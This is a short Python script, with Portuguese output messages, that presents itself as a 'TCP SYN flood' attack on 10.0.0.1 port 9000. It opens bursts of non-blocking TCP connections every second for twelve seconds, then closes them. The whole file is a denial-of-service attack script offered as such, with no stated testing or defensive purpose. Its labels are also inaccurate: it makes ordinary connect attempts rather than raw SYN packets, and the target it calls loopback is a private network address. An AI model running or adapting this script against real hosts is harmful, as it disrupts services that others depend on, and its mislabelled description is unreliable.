import socket
import time
import sys

def run_flood():
    target_ip = "10.0.0.1"
    target_port = 9000
    
    print(f"=== INICIANDO ATAQUE LOCAL LOOPBACK (TCP SYN FLOOD) ===")
    print(f"Alvo: {target_ip}:{target_port}")
    
    sockets_list = []
    try:
        for sec in range(12):
            print(f"Segundo {sec+1}/12 - Enviando rajada...")
            for i in range(15):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                try:
                    s.connect_ex((target_ip, target_port))
                    sockets_list.append(s)
                except Exception:
                    pass
            time.sleep(1.0)
            
        print(f"Rajada concluída! {len(sockets_list)} fluxos gerados.")
    except KeyboardInterrupt:
        print("Interrompido.")
    finally:
        for s in sockets_list:
            try:
                s.close()
            except Exception:
                pass
        print("Sockets liberados.")

if __name__ == "__main__":
    run_flood()
